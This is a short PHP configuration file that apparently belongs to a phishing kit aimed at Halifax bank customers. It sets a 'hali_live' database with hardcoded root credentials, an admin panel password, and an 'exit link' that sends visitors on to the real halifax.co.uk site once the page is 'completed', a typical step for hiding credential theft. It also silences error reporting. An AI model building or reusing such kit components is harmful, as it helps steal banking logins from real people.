<?php
error_reporting(0);
$servername = "localhost";
$database = "hali_live";
$username = "root";
$password = "123456-abcdef";

// admin panel password
$admin_panel_password = "1234"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obviously]
$exit_link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwignKva9cTqAhVjmuAKHeOIDAEQFjAAegQIARAB&url=https%3A%2F%2Fwww.halifax.co.uk%2F&usg=AOvVaw3tdie5MvxYZvJ55_IUg21f";


?>